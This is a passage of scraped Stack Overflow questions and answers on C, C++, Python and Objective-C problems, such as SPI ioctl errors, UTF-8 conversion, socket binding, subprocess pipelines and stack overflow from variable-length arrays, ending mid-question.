","9530","","<p><a href=""http://docs.python.org/3/library/concurrent.futures.html#concurrent.futures.Executor.map"" rel=""nofollow""><code>concurrent.futures.Executor.map</code></a> is semantically identical to the built-in function <a href=""http://docs.python.org/3/library/functions.html#map"" rel=""nofollow""><code>map</code></a>.  The second and subsequent <em>non-keyword</em> arguments specify the iterables to apply the given function to.</p>

<p>In your case, you're saying ""Here are two iterables: a list of 100 elements (<code>lst100</code>) and the integer 60.  Please call the function <code>str()</code> on each pair of elements <code>a</code> and <code>b</code> coming form the two iterables respectively, and return the list of results.""  But since the integer 60 is not actually an iterable object, it fails.</p>

<p>Assuming you wanted to specify a timeout of 60 seconds, you need to pass it as a keyword argument like so:</p>

<pre><code>future_to_url = executor.map(str, lst100, timeout=60)
</code></pre>

<p>Keyword arguments are distinguished from positional arguments by the presence of the <code>name=</code> prefix before the value being passed.  In this case, the argument name is <code>timeout</code>.</p>
"
"<p>I use the the code below to output data from SPI port of an embedded board (olimex imx233-micro -- it is not a board specific question). When I run the code <code>ioctl</code> return ""<strong>bad address</strong>"". I am modifying the code on <a href=""http://twilight.ponies.cz/spi-test.c"" rel=""nofollow"">http://twilight.ponies.cz/spi-test.c</a> which works fine. Could anyone tell me what am I doing wrong?</p>

<pre><code>root@ubuntu:/home# gcc test.c -o test
test.c:20: warning: conflicting types for ‘msg_send’
test.c:16: note: previous implicit declaration of ‘msg_send’ was here
root@ubuntu:/home# ./test
errno:Bad address - cannot send SPI message
root@ubuntu:/home# uname -a
Linux ubuntu 3.7.1 #2 Sun Mar 17 03:49:39 CET 2013 armv5tejl GNU/Linux
</code></pre>

<p>Code:</p>

<pre><code>//test.c
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;linux/types.h&gt;
#include &lt;linux/spi/spidev.h&gt;
#include &lt;errno.h&gt;

static uint16_t delay;

int main(int argc,char *argv[]){
     msg_send(254); //the message that I want to send decimal ""254""
     return 0;
}

void msg_send(int msg){
    int fd;
    int ret = 0;
    fd = open(""/dev/spidev32766.1"", O_RDWR); //ls /dev outputs spidev32766.1
    if(fd &lt; 0){
        fprintf(stderr, ""errno:%s - FD could be not opened\n "", strerror(errno));  
        exit(1);
        }

    struct spi_ioc_transfer tr = {
        .len = 1,
        .delay_usecs = delay,
        .speed_hz = 500000, //500 kHz
        .bits_per_word = 8,
        .tx_buf = msg,
        .rx_buf = 0, //half duplex
    };

    ret = ioctl(fd, SPI_IOC_MESSAGE(1), &amp;tr);
    if (ret &lt;1 ){
        fprintf(stderr, ""errno:%s - cannot send SPI message\n "", strerror(errno));
    }
    close(fd);
}
</code></pre>

<p>Thank you!</p>
","9530","","<p>The error message ""Bad address"" comes from the error code <code>EFAULT</code>, which happens when you pass an address to the kernel which is not a valid virtual address in your process's virtual address space.  The address to your <code>tr</code> structure is clearly valid, so the problem must be with one of its members.</p>

<p>According to the <a href=""http://lxr.free-electrons.com/source/include/uapi/linux/spi/spidev.h#L52"">definition of <code>struct spi_ioc_transfer</code></a>, the <code>.tx_buf</code> and <code>.rx_buf</code> members must be pointers to userspace buffers, or null.  You're setting <code>.tx_buf</code> to the integer 254, which is not a valid userspace pointer, so that's where the bad address is coming from.</p>

<p>I'm not familiar with this IOCTL, so my best guess is that you need to bass the data in binary.  One way to do that would be this:</p>

<pre><code>struct spi_ioc_transfer tr = {
    .len = sizeof(msg),  // Length of rx and tx buffers
     ...
    .tx_buf = (u64)&amp;msg, // Pointer to tx buffer
    ...
};
</code></pre>

<p>If you need to send it as ASCII instead, then you should use a function such as <a href=""http://linux.die.net/man/3/snprintf""><code>snprintf(3)</code></a> to convert the integer to an ASCII string, and then point the TX buffer at that string and set the length accordingly.</p>
"
"<p>I am currently working on an application in C++, that ties into Lua, that ties into Flash (in that order). My goal at the moment is getting <code>wchar_t</code>s from C++ into Flash, via Lua. I would love any insights as to how I can accomplish this!</p>

<p><em>If any other information is required, please ask and I'll do my best to provide it</em></p>

<hr>

<p><em><strong>What I have tried</em></strong></p>

<p>It's my understanding that Lua is not a fan of Unicode, but it should still be able to receive the string of bytes from my C++ application. I imagine there must be a way to then pass those bytes over to Flash to then render out my intended Unicode. So what I've done so far:</p>

<p><strong>C++:</strong></p>

<pre><code>//an example wchar_t*
const wchar_t *text = L""Test!"";

//this function pushes a char* to my Lua code
lua.PushString((char*)text); //directly casting text to a char*... D:
</code></pre>

<p><strong>Lua:</strong></p>

<pre><code>theString = FunctionThatGetsWCharFromCpp();
flash.ShowString(theString);
</code></pre>

<p><strong>Flash:</strong></p>

<pre><code>function ShowString(theString:String)
{
    myTextField.text = theString;
}
</code></pre>

<p>Now the outcome here is that <code>myTextField</code> only shows ""T"". This made sense to me. The cast from <code>wchar_t</code> to <code>char</code> would end up padding out the <code>char</code>s with some zeros, especially since ""T"" doesn't really utilize both bytes of a <code>wchar_t</code>. A quick look at the <a href=""http://pgl.yoyo.org/luai/i/lua_pushstring"" rel=""nofollow"">documentation</a> yields:</p>

<p><strong>lua_pushstring</strong></p>

<blockquote>
  <p>The string cannot contain embedded zeros; it is assumed to end at the first zero.</p>
</blockquote>

<p>So I ran a little test:</p>

<p><strong>C++:</strong></p>

<pre><code>//prefixing with a Japanese character 
//which will use both bytes of the wchar_t
const wchar_t *text = L""たTest!"";
</code></pre>

<p>The Flash textbox now reads: ""_0T"", 3 characters. Makes total sense, the 2 bytes of the Japanese character + T, then termination.</p>

<p>I understand what is going on, but I am still completely unsure of how to tackle this problem. And I'm really unsure of what to search for. Is there a specific Lua function I can use to pass a wad of bytes over to Lua from C++ (I've read somewhere that <code>lua_pushlstring</code> is often used for this, but that also terminates at first zero)? Is there a Flash datatype that will accept these bytes, then I'll need to do some sort of conversion to get them into a readable, multibyte string? or is this just really not possible?</p>

<p><strong>Note:</strong><br />
I'm not too familiar with Unicode and code pages and whatnot, so I'm not too sure if there'll also be a step where I'll need to specify the correct encoding in Flash so that I can get the correct output - but I'm happy to cross that bridge when I get there, but if anyone has any insight here too, that would be great!</p>
","9530","","<p>I don't know if this will work, but I'd recommend trying to use <a href=""http://en.wikipedia.org/wiki/UTF-8"" rel=""nofollow"">UTF-8</a>.  A string encoded in UTF-8 doesn't have any embedded zeros in it, so Lua should be able handle it, and Flash ought to also be able to handle it, depending on how exactly the languages interface.</p>

<p>Here's one way to convert a wide-character string to UTF-8 using <a href=""http://linux.die.net/man/3/setlocale"" rel=""nofollow""><code>setlocale(3)</code></a> <a href=""http://linux.die.net/man/3/wcstombs"" rel=""nofollow""><code>wcstombs(3)</code></a>:</p>

<pre><code>// Error checking omitted for expository purposes

// Call this once at program startup.  If you'd rather not change the locale,
// you can instead write your own conversion routine (but beware of UTF-16
// surrogate pairs if you do)
setlocale(LC_ALL, ""en_US.UTF-8"");

// Do this for each string you want to convert
const wchar_t *wideString = L""たTest!"";
size_t len = wcslen(wideString);
size_t maxUtf8len = 4 * len + 1;  // Each wchar_t encodes to a max of 4 bytes
char *utf8String = new char[maxUtf8len];
wcstombs(utf8String, wideString, maxUtf8len);
...
// Do stuff with utf8string
...
delete [] utf8String;
</code></pre>

<p>If you're on Windows, you can instead use the <a href=""http://msdn.microsoft.com/en-us/library/dd374130.aspx"" rel=""nofollow""><code>WideCharToMultiByte</code></a> function with the <code>CP_UTF8</code> code page to do the conversion, since I don't believe that the Visual Studio C runtime supports UTF-8 locales:</p>

<pre><code>// Error checking omitted for expository purposes
const wchar_t *wideString = L""たTest!"";
size_t len = wcslen(wideString);
size_t maxUtf8len = 4 * len + 1;  // Each wchar_t encodes to a max of 4 bytes
char *utf8String = new char[maxUtf8len];
WideCharToMultiByte(CP_UTF8, 0, wideString, len + 1, utf8String, maxUtf8len, NULL, NULL);
...
// Do stuff with utf8string
...
delete [] utf8String;
</code></pre>
"
"<p>I'm trying to send UDP packets in objective C. More specifically, building with xcode targeting the iphone 6.1 simulator.</p>

<p>I can't seem to actually receive the data I send. Weirdly, I do get a data event... the data's just been truncated to length 0.</p>

<p>I've cut it down as much as I can, to make a dead simple test I think should pass.</p>

<pre><code>#import ""UdpSocketTest.h""
#include &lt;arpa/inet.h&gt;
#import &lt;CoreFoundation/CFSocket.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

@implementation UdpSocketTest

static int receivedByteCount = 0;
void onReceive(CFSocketRef socket, CFSocketCallBackType type, CFDataRef address, const void *data, void *info);
void onReceive(CFSocketRef socket, CFSocketCallBackType type, CFDataRef address, const void *data, void *info) {
    // this gets called once, but CFDataGetLength(data) == 0
    receivedByteCount += CFDataGetLength(data);
}

-(void) testUdpSocket {
    struct sockaddr_in addr;
    memset(&amp;addr, 0, sizeof(addr));
    addr.sin_len = sizeof(addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5000); // &lt;-- doesn't really matter, not sending from receiver
    inet_pton(AF_INET, ""127.0.0.1"", &amp;addr.sin_addr);
    CFSocketContext socketContext = { 0, (__bridge void*)self, CFRetain, CFRelease, NULL };

    // prepare receiver
    CFSocketRef receiver = CFSocketCreate(kCFAllocatorDefault, PF_INET, SOCK_DGRAM, IPPROTO_UDP ,kCFSocketDataCallBack, (CFSocketCallBack)onReceive, &amp;socketContext);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), CFSocketCreateRunLoopSource(NULL, receiver, 0), kCFRunLoopCommonModes);
    CFSocketConnectToAddress(receiver, CFDataCreate(NULL, (unsigned char *)&amp;addr, sizeof(addr)), -1);

    // point sender at receiver
    CFSocketRef sender = CFSocketCreate(kCFAllocatorDefault, PF_INET, SOCK_DGRAM, IPPROTO_UDP, kCFSocketDataCallBack, (CFSocketCallBack)onReceive, &amp;socketContext);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), CFSocketCreateRunLoopSource(NULL, sender, 0), kCFRunLoopCommonModes);
    CFSocketConnectToAddress(sender, CFSocketCopyAddress(receiver), -1);

    // send data of sixty zeroes, allow processing to occur
    CFSocketSendData(sender, NULL, (__bridge CFDataRef)[NSMutableData dataWithLength:60], 2.0);
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];

    // did the data arrive?
    STAssertTrue(receivedByteCount &gt; 0, @"""");
    // nope
}
@end
</code></pre>

<p>What am I doing wrong? I know it's something obvious, but I can't see it.</p>
","9530","","<p>I'm surprised you're getting any callbacks at all—you're never actually binding your receiver to your local port.  You're creating two sockets and telling both of them ""I went to send data to <code>127.0.0.1:5000</code>"", but nowhere are you saying ""I want to receive data on <code>127.0.0.1:5000</code>.</p>

<p>In order to do that, you should be calling <a href=""https://developer.apple.com/library/mac/#documentation/CoreFOundation/Reference/CFSocketRef/Reference/reference.html"" rel=""nofollow""><code>CFSocketSetAddress</code></a> on the receiver socket, <em>not</em> <code>CFSocketConnectToAddress</code>.  This is equivalent to calling the <a href=""http://developer.apple.com/library/ios/#documentation/system/conceptual/manpages_iphoneos/man2/bind.2.html"" rel=""nofollow""><code>bind(2)</code></a> system call on the underlying native BSD socket.</p>
"
"<p>Pardon me for this silly question. I would like to know is there any possibility to run the following program in windows</p>

<pre><code> #import&lt;Foundation/Foundation.h&gt;

int main(int argc,const char* argv[]) { 

NSAutoReleasePool *pool =[[NSAutoReleasePool  alloc]init];

NSLog(@""Hello World"")

[pool drain];

 }
</code></pre>

<p>I know there are objective c compilers available for windows but I want to know is there anything support The <code>&lt;Foundation/Foundation.h&gt;</code></p>
","9530","","<p>Yes.  One possibility is to compile it with GCC using the <a href=""http://www.gnustep.org/"" rel=""nofollow"">GNUstep</a> framework.</p>
"
"<p>I'm trying to use</p>

<p><a href=""https://pypi.python.org/pypi/dbf"" rel=""nofollow"">https://pypi.python.org/pypi/dbf</a></p>

<p>To read a database file.  I'm trying to print the records as follows:</p>

<pre><code>for record in race_db:
    print record
</code></pre>

<p>This gives me an error message</p>

<blockquote>
  <p>UnicodeDecodeError: 'ascii' codec can't decode byte 0xc9 in position 4: ordinal
  not in range(128)</p>
</blockquote>

<p>So I tried to map to unicode</p>

<pre><code>string_record = [unicode(item) for item in record]
</code></pre>

<p>same thing. utf-8:</p>

<pre><code>string_record = [unicode(item, ""utf8"") for item in record]
</code></pre>

<blockquote>
  <p>TypeError: coercing to Unicode: need string or buffer, datetime.date found</p>
</blockquote>

<p>I just want some to sort tostring functionality what am I doing wrong? I know I can successfully loop through all the records because something like:</p>

<pre><code>print 'blah'
</code></pre>

<p>works fine.  It's just something in the encoding is tripping me up.</p>
","9530","","<p>The single byte <code>\xC9</code> is not a valid encoding of anything in UTF-8.  You need to figure out how the text is currently encoding—in this case, it's most likely either <a href=""http://en.wikipedia.org/wiki/ISO_8859-1"">ISO 8859-1</a> or <a href=""http://en.wikipedia.org/wiki/Windows-1252"">Windows-1252</a>.  Then, decode it accordingly.</p>

<p>For example, if it's Windows-1252, you'd decode it as follows:</p>

<pre><code>string_record = 'foo \xc9 bar'
print string_record.decode('Windows-1252')  # Output: ""foo É bar""
</code></pre>
"
"<p><strong>Question</strong></p>

<p>How can I fix my program to make it so that the socket is always connected? Also, please test your code. I have seen many answers about this, but none have worked. </p>

<p>Thank you so much for the help.</p>

<p><strong>Background</strong></p>

<p>For a while, I have worked on a program to send messages over LAN. I have been trying to work on integrating my knowledge of the GUI and of sockets in this project. But, <em>no matter what I seem to do, the socket has been unable to stay connected.</em> </p>

<p><a href=""http://stackoverflow.com/users/1993598/xxmbabanexx?tab=questions&amp;sort=newest"">I have asked many questions about this</a>, but no matter what I have not been able to discover the correct fix. I believe that this is my fault - I am self taught and have perhaps not asked the correct questions. This time, I have chosen a blanket statement; please pardon my lack of finesse, but this seems to be the best way as of now. <a href=""http://pastebin.com/rp17qaSL"" rel=""nofollow"">Here is a link to my code on paste bin.</a> I have included the most likely problematic parts below.</p>

<p><strong>Error Message</strong></p>

<pre><code>('localhost', 1234)
Socket created
Socket bind complete
Socket now listening
Exception in Tkinter callback
Traceback (most recent call last):
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk/Tkinter.py"", line 1410, in __call__
    return self.func(*args)
  File ""/Volumes/XXMBABANEXX'S USB/Python Programs/Sockets/IM Project/Server/Functions/Simple Server.py"", line 148, in &lt;lambda&gt;
    command = lambda: send_msg(s,message))
  File ""/Volumes/XXMBABANEXX'S USB/Python Programs/Sockets/IM Project/Server/Functions/Simple Server.py"", line 82, in send_msg
    conn.sendall(my_message)
  File ""/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/socket.py"", line 224, in meth
    return getattr(self._sock,name)(*args)
error: [Errno 57] Socket is not connected
</code></pre>

<p><strong>Relevant Code</strong></p>

<p>As the error message says that my <code>send_msg</code> function is having issues, I have decided to include it below.</p>

<pre><code>def send_msg(conn, message):

    """"""Send Messages""""""
    #Send some data to the remote server
    my_message = message.get(""0.0"", END)


     #set the whole string
    conn.sendall(my_message)
</code></pre>

<p>Thank you so much for all of your help. This issue has been bothering me for months, and I refuse to let it go.</p>
","9530","","<p>You're sending the data on the wrong socket—you need to be sending it on the client socket, not the listening socket.  The general pattern for a server looks like this:</p>

<pre><code># Set up the listening socket
listen_socket = socket.socket(...)
listen_socket.bind(...)
listen_socket.listen(...)

# Accept connections and process them
while should_continue_running:
    client_socket, client_addr = listen_socket.accept()

    # All communication with the new client should now happen on client_socket,
    # NOT on listen_socket:
    client_socket.recv(...)
    client_socket.send(...)
    ...

    client_socket.close()
</code></pre>
"
"<p>The following code is written in C++ but using realloc from stdlib.h because I don't know much about std::vector.</p>

<p>Anyway, I get this weird run time error "" "" _CrtIsValidHeapPointer(pUserData), dbgheap.c"".</p>

<p>If you would like to see the whole method or code please let me know.</p>

<p>I have 2 classes, Student and Grades. Student contains </p>

<pre><code>char _name[21];         
char _id[6];             

int _numOfGrades;
int* _grades;
float _avg;
</code></pre>

<p>and Grade simply contains </p>

<pre><code>Student* _students;
int _numOfStudents;
</code></pre>

<p>while the following works </p>

<p><code>_grades = (int *)realloc(_grades,(sizeof(int)*(_numOfGrades+1)));</code></p>

<p>this will create that weird run time error:</p>

<pre><code>_students = (Student *)realloc(_students,(sizeof(Student)*(_numOfStudents+1)));
</code></pre>

<p>Both _grades and _students are created with new with no problem at all. The problem is only while trying to realloc _students.</p>

<p>Any input will be welcome.</p>
","9530","","<p>You cannot mix allocators—if you allocate memory with <code>operator new[]</code>, you <strong>must</strong> deallocate it with <code>operator delete[]</code>.  You cannot use <code>free()</code>, <code>realloc()</code>, or any other memory allocator (e.g. Windows' <code>GlobalFree()</code>/<code>LocalFree()</code>/<code>HeapFree()</code> functions).</p>

<p><code>realloc()</code> can only reallocate memory regions which were allocated with the <code>malloc()</code> family of functions (<code>malloc()</code>, <code>calloc()</code>, and <code>realloc()</code>).  Attempting to <code>realloc</code> any other memory block is undefined behavior—in this case, you got lucky and the C runtime was able to catch your error, but if you were unlucky, you might silently corrupt memory and then later crash at some random point in an ""impossible"" state.</p>
"
"<p>I am trying to translate a bash command to a subprocess in python.  The bash command is:</p>

<p>cat LogFile.msg.log | grep ABCD | awk '{print $14,$10,$5,$7}' | sort -t' ' -k4 -n -r | head -10 > output.csv</p>

<p>So far I have the following for the subprocess:</p>

<pre><code>cat = subprocess.Popen(['cat', 'LogFile.msg.log'],
                        stdout=subprocess.PIPE,
                        )
grep = subprocess.Popen(['grep', 'ABCD'],
                        stdin=cat.stdout,
                        stdout=subprocess.PIPE,
                        )
awk = subprocess.Popen(['awk', '{print $14,$10,$5,$7}'],
                        stdin=grep.stdout,
                        stdout=subprocess.PIPE,
                        )
sort = subprocess.Popen(['sort', '-t','' '', '-k4', '-n', '-r'],
                        stdin=awk.stdout,
                        stdout=subprocess.PIPE,
                        )
head = subprocess.Popen(['head', '-10'],
                        stdin=sort.stdout,
                        stdout=subprocess.PIPE,
                        )
out = subprocess.Popen(['&gt;', 'output.csv'],
                        stdin=head.stdout,
                        stdout=subprocess.PIPE,
                        )
end_of_pipe = out.stdout
</code></pre>

<p>Right now I'm receiving the following error:</p>

<pre><code>Sort: empty tab
Traceback (most recent call last):
  File ""./latency2"", line 39, in &lt;module&gt;
    stdout=subprocess.PIPE,
  File ""/usr/lib64/python2.6/subprocess.py"", line 639, in __init__
    errread, errwrite)
  File ""/usr/lib64/python2.6/subprocess.py"", line 1228, in _execute_child
    raise child_exception
OSError: [Errno 2] No such file or directory
</code></pre>

<p>I'm sure I'm missing something, but not sure what.</p>
","9530","","<p>You have two problems.  The first is that you're not translating the arguments to <code>sort</code> correctly.  When you run this <code>sort</code> command:</p>

<pre><code>sort -t' ' -k4 -n -r
</code></pre>

<p>The shell pastes together the tokens <code>-t</code> and <code>' '</code> into the single argument <code>""-t ""</code> (dash, tee, space).  So, the correct subprocess arguments for it should be:</p>

<pre><code>sort = subprocess.Popen(['sort', '-t ', '-k4', '-n', '-r'],
                        stdin=awk.stdout,
                        stdout=subprocess.PIPE,
                        )
</code></pre>

<p>The second problem is the final redirection to a file with the <code>&gt; output.csv</code> tokens.  When the shell sees this, it doesn't run a command named <code>&gt;</code>; rather, it opens the file <code>output.csv</code> for writing and sets that to the standard output handle of the last command.  So, you shouldn't be trying to run a command named <code>&gt;</code> as a subprocess; you instead need to emulate the shell by opening a file:</p>

<pre><code>head = subprocess.Popen(['head', '-10'],
                        stdin=sort.stdout,
                        stdout=open('output.csv', 'w'),  # Not a pipe here
                        )
</code></pre>
"
"<p>And if not, is the benefit of using unicode to display more characters?</p>
","9530","","<p>That depends on a lot of things.  If your program is simple, you might be able to get away with it, but odds are that there's going to be some API where the presence of Unicode strings is going to trip you up.</p>

<p>The simplest example would be filenames—if there's anywhere in your program where you ask the user to specify a file, he could easily specify a filename containing a Unicode character in its path.  If you only use the ANSI APIs, such as <code>fopen()</code> or <code>CreateFileA()</code>, then you will not be able to open that file, and the user will be frustrated that your program doesn't work.  So unless you have a really good reason, you should almost always be using the Unicode APIs (e.g. <code>_wfopen()</code> or <code>CreateFileW()</code> in this case).</p>
"
"<p>I am in the need of using some functions in a C made program. To test I defined the following :</p>

<p>This is my .h file :</p>

<pre><code>namespace amt
{
    class AMT_EXPORT FaceRecognition
    {   
        public:
            std::string amt_test_string(std::string in);
    };  
};
</code></pre>

<p>This is my .cpp file :</p>

<pre><code>#include &lt;memory.h&gt;
#include &lt;string&gt;
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include ""api_shared.h""
#include &lt;sys/stat.h&gt;

using namespace std;

std::string amt::FaceRecognition::amt_test_string (std::string in)
{
    std::string s=""in: ""+in;
    std::cout&lt;&lt;s&lt;&lt;std::endl;

    return s;
}
</code></pre>

<p>I am trying to invoke the method like this :</p>

<pre><code> const string str = ""C:\\minimal.dll"";
[DllImport(str)]
public static extern string amt_test_string(string input);
static void Main(string[] args)
{
    string myinput = ""12"";
    string myoutput = """";
    myoutput = amt_test_string(myinput);
    Console.WriteLine(myoutput);
    Console.Read();

}
</code></pre>

<p>But im getting an error saying that it cannot find the entry point named amt_test_string..why so? I am a newbie in C btw</p>
","9530","","<p>That's not a C DLL, that's a C++ DLL.  C and C++ are <em>not</em> the same language.  In particular, C++ has name mangling, so the function name which gets exported to the DLL is <em>decorated</em>.</p>

<p>I'd strongly recommend that you avoid having C++ exports in your DLL for that reason.  If you use only C exports, the symbol name will be predictable (i.e. will not depend on the specific details of how your C++ compiler decorates names), and you won't have to worry about runtime differences, like how your C++ standard library implements <code>std::string</code>.</p>

<p>I'd recommend your DLL export look like this:</p>

<pre><code>extern ""C""  // This says that any functions within the block have C linkage
{

// Input is 'in', output gets stored in the 'out' buffer, which must be 'outSize'
// bytes long
void DLLEXPORT amt_FaceRecogniztion_amt_test_string(const char *in, char *out, size_t outSize)
{
    ...
}

}
</code></pre>

<p>This interface does not rely on any particular library's <code>std::string</code> implementation, and C# knows how to martial <code>char*</code> parameters as C strings.  However, memory management is more complicated, as you need to figure out an upper bound on how big the output is going to be and pass in an appropriately sized bufer.</p>
"
"<pre><code>#include &lt;iostream&gt;
#include &lt;string&gt;

void reverse(char*);

void reverse(char* str) 
{
    char * end = str;
    char tmp; 
    if (str) {
        while (*end) {
            ++end;
        }
     }
     --end;
     while (str &lt; end) {
         tmp = *str;
         *str++ = *end;
         *end-- = tmp;
     }
}

int main {
   char * string;
   string = ""Hello"";
   reverse(string);
   std::cout &lt;&lt; string;
   return 0; 
}
</code></pre>

<p>Hello. I am trying to test this simple function and get the error ""expecting primary expression before 'char'"" on the line where I declare the variable string as a char pointer. Excuse my being a neophyte and probably making additional errors. Thanks for your help!</p>
","9530","","<p>You forgot the argument list for main, which has two allowable values:</p>

<pre><code>int main(void)  // Option 1
{
    // The 'void' is optional; in C++, it's equivalent to ""int main()"", but there
    // is a difference in plain C
    ...
}

// OR

int main(int argc, char *argv[])  // Option 2
{
    // The names of the variables argc and argv can of course be changed; argv
    // can also be declared as char**
    ...
}
</code></pre>

<p>You also have a semantic problem, which is that string literals like like <code>""Hello""</code> are non-modifiable.  There is a deprecated conversion from <code>const char[]</code> to <code>char*</code>, but that should be avoided, and your compiler should warn you about it if you enable warnings.  If you attempt to run the code, you will get a segmentation fault or access violation.</p>

<p>To fix that, you should declare your <code>string</code> variable as a modifiable array, not a pointer:</p>

<pre><code>char string[] = ""Hello"";
</code></pre>
"
"<p>I get a segmentation fault when I compile.</p>

<p>Something to do with memory allocation in the first for loop when I try to populate the table array in main() I think?</p>

<p>It works if I call a smaller file but not with the 'bigger' table.bmp file.</p>

<p>I do not understand why? (I am pretty new to this)</p>

<p>Any help would be much appreciated.</p>

<p>Thanks in advance</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;malloc.h&gt;

unsigned char *read_bmp(char *fname,int* _w, int* _h)
{
    unsigned char head[54];
    FILE *f = fopen(fname,""rb"");

    // BMP header is 54 bytes
    fread(head, 1, 54, f);

int w = head[18] + ( ((int)head[19]) &lt;&lt; 8) + ( ((int)head[20]) &lt;&lt; 16) + ( ((int)head[21]) &lt;&lt; 24);
int h = head[22] + ( ((int)head[23]) &lt;&lt; 8) + ( ((int)head[24]) &lt;&lt; 16) + ( ((int)head[25]) &lt;&lt; 24);

// lines are aligned on 4-byte boundary
int lineSize = (w / 8 + (w / 8) % 4);
int fileSize = lineSize * h;

unsigned char *img = malloc(w * h), *data = malloc(fileSize);

// skip the header
fseek(f,54,SEEK_SET);

// skip palette - two rgb quads, 8 bytes
fseek(f, 8, SEEK_CUR);

// read data
fread(data,1,fileSize,f);



// decode bits
int i, j, k, rev_j;
for(j = 0, rev_j = h - 1; j &lt; h ; j++, rev_j--) {
    for(i = 0 ; i &lt; w / 8; i++) {
        int fpos = j * lineSize + i, pos = rev_j * w + i * 8;
        for(k = 0 ; k &lt; 8 ; k++)
            img[pos + (7 - k)] = (data[fpos] &gt;&gt; k ) &amp; 1;
    }`enter code here`
}

free(data);
*_w = w; *_h = h;
return img;
}

int main()
{

int w, h, i, j, x, y, b=0, butpos=0;

//Get array data

unsigned char* imgtable = read_bmp(""table.bmp"", &amp;w, &amp;h);
int table[w][h];

printf(""w=%i \n"", w);
printf(""h=%i \n"", h);

//make table array

 for(j = 0 ; j &lt; h ; j++)
{

    for(i = 0 ; i &lt; w ; i++)
        table[j][i] = imgtable[j * w + i] ? 0 : 1;

}
</code></pre>
","9530","","<p>You're trying to allocate the image data on the stack.  When the image is too big, this causes a stack overflow.  This code is the problem:</p>

<pre><code>int main()
{

    int w, h, i, j, x, y, b=0, butpos=0;

    //Get array data

    unsigned char* imgtable = read_bmp(""table.bmp"", &amp;w, &amp;h);
    int table[w][h];  // &lt;-- HERE
    ...
</code></pre>

<p>This is using a feature of C99 called <em>variable-length arrays</em> (VLAs), where an array of non-constant size (in this case, a 2D <code>w</code> by <code>h</code> array, where <code>w</code> and <code>h</code> are not known until runtime) is allocated on the stack.</p>

<p>The mention of the function <code>_alloca</code> in your stack trace should have cued you to this -- the <a href=""http://linux.die.net/man/3/alloca"" rel=""nofollow""><code>alloca(3)</code></a> function allocates a dynamic amount of memory on the stack.  And since you're not explicitly calling <code>alloc()</code> anywhere yourself, it must be coming from a usage of VLAs.</p>

<p>The fix, as you mentioned, is to allocate the image data on the heap, not on the stack:</p>

<pre><code>data = malloc(h * w * sizeof(*data));
table = malloc(h * sizeof(*table));
for (i = 0; i &lt; h; i++)
{
    table[i] = &amp;data[i * w];
}

...

free(table);
free(data);
</code></pre>
"
"<p>Can Checkpoint/restart be implemented using the core dump of  a process? The core file contains a complete memory dump of the process, thus in theory it should be possible to
restore the process to the same state it was in when the core was dumped.</p>
","9530","","<p>No, this is not possible in general without special support from the kernel.  The kernel maintains a LOT of per-process state, such as the file descriptor table, IPC objects, etc.</p>

<p>If you were willing to make lots of simplifying assumptions, such as no open files, no open sockets, no living IPC objects, no shared memory regions, and more, then <em>in theory</em> it would be possible, but in practice I don't believe it's possible with Linux even with those concessions.</p>
"
"<p>I am trying to make word search using fgetc. I understand what fgetc does but i am getting seg fault. on running the gdb test, i returns the following. Is there an easier way to implement the search function?? i am new to programming.
thank you for the help. </p>

<pre><code>#0  0x00007ffff7aa4c64 in getc () from /lib64/libc.so.6
#1  0x000000000040070c in main ()
</code></pre>

<p>Where am i going wrong? </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int isAlpha(char c)
{
    if( c &gt;= 'A' &amp;&amp; c &lt;='Z' || c &gt;= 'a' &amp;&amp; c &lt;='z' || c &gt;= '0' &amp;&amp; c &lt;= '9' )
    {
        return 1;        
    }
    else
    {
        return 0;
    }
}

int CheckFunctionn(int length, int message_counter, char ref_word[], char newmessage[])
{
    int newCounter = 0;
    int counterSuccess = 0;

    while(newCounter &lt; length)
    {
        if(ref_word[newCounter] == newmessage[newCounter + message_counter])
        {
            counterSuccess++;
        }
        newCounter++;
    }

    if(counterSuccess == length)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}

int main(int argc, char *argv[])
{
    char message[300];
    int counter = 0;
    int ref_length = 0;
    int alphaCounter = 0;
    int alphaCounterTime = 0;
    int messageCounter = 0;
    int word_counter = 0;

    FILE* input;
    FILE* output;

    //long fileLength;
    //int bufferLength;
    //char readFile;
    //int forkValue;

    input = fopen(argv[2],""r"");
    output = fopen(argv[3],""w"");

    int c;
    c = fgetc(input);

    while(c != EOF)
    {
        while((argv[1])[ref_length] !='\0')
        {
            // if string is ""HEY"", (argv[1]) is HEY, ref_counter is the length
            // which in this case will be 3.
            ref_length++; //&lt;-- takes care of the length.
        }

        while(alphaCounter &lt; ref_length)
        {
            // this will add to alphaCounter everyetime alphaCT is success.
            alphaCounterTime += isAlpha((argv[1])[alphaCounter]);
            alphaCounter++;
        }

        if(alphaCounterTime != ref_length)
        {
            return 0;
        }

        if((messageCounter == 0 ) &amp;&amp; (message[messageCounter + ref_length] == ' ' || message[messageCounter] == '\n' || message[messageCounter]== '\t')) // counts the whole things and brings me to space
        {
            // compare the message with the word
            word_counter += CheckFunctionn(ref_length, messageCounter, argv[1], message);
        }

        if((message[messageCounter] == ' ' || message[messageCounter] == '\n' || message[messageCounter]== '\t')  &amp;&amp; (message[messageCounter +  ref_length + 1] == ' ' || message[messageCounter + ref_length + 1] == '\n' || message[messageCounter + ref_length + 1]== '\t'))
        {
            word_counter += CheckFunctionn(ref_length, messageCounter + 1, argv[1], message);
        }

        if((message[messageCounter]== ' '|| message[messageCounter] == '\n' || message[messageCounter]== '\t') &amp;&amp; (messageCounter + ref_length+1)== counter) //&lt;-- this means the length of the message is same
        {
            word_counter += CheckFunctionn(ref_length, messageCounter + 1, argv[1], message);
        }

